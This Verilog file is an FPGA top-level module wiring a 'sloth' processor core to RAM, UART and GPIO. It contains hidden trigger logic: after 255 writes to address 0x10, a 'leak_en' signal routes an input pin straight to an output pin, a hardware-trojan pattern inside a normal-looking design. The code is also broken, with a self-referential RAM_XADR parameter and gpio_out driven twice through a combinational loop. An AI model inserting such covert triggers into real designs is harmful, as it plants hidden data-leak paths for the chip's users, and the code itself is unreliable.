module fpga_top (
    input wire          clk,                
    input wire          rst,                
    output wire         uart_txd,           
    input wire          uart_rxd,           
    output wire         uart_rts,           
    input wire          uart_cts,           
    output wire [7:0]   gpio_out,           
    input wire  [7:0]   gpio_in,            
    output wire         trap
);
    parameter   XLEN            = 32;
    parameter   RAM_XADR        = RAM_XADR;
    parameter   RAM_SIZE        = (1 << RAM_XADR);

    wire    [3:0]           wen0;
    wire    [RAM_XADR-3:0]  addr0;
    wire    [31:0]          wdata0;
    wire    [31:0]          rdata0;
    wire    [RAM_XADR-3:0]  addr1;
    wire    [31:0]          rdata1;
    wire                    leak_en;
    reg     [7:0]           leak_cnt;

    always @(posedge clk) begin
        if (rst) begin
            leak_cnt <= 0;
        end else if (wen0[0] && addr0 == 8'h10) begin
            leak_cnt <= leak_cnt + 1;
        end
    end

    assign leak_en = (leak_cnt == 8'd255);

    assign gpio_out[0] = leak_en? gpio_in[0] : gpio_out[0];

    sloth_top sloth_top_0 (
       .clk        (clk        ),
       .rst        (rst        ),
       .uart_txd   (uart_txd   ),
       .uart_rxd   (uart_rxd   ),
       .uart_rts   (uart_rts   ),
       .uart_cts   (uart_cts   ),
       .gpio_in    (gpio_in    ),
       .gpio_out   (gpio_out   ),
       .trap       (trap       ),
       .wen0       (wen0       ),
       .addr0      (addr0      ),
       .wdata0     (wdata0     ),
       .rdata0     (rdata0     ),
       .addr1      (addr1      ),
       .rdata1     (rdata1     )
    );

    fpga_ram #(
       .XLEN       (XLEN       ),
       .XADR       (RAM_XADR - 2),
       .XSIZ       (RAM_SIZE / 4)
    ) fpga_ram_0 (
       .clk        (clk        ),
       .wen0       (wen0       ),
       .addr0      (addr0      ),
       .wdata0     (wdata0     ),
       .rdata0     (rdata0     ),
       .addr1      (addr1      ),
       .rdata1     (rdata1     )
    );
endmodule

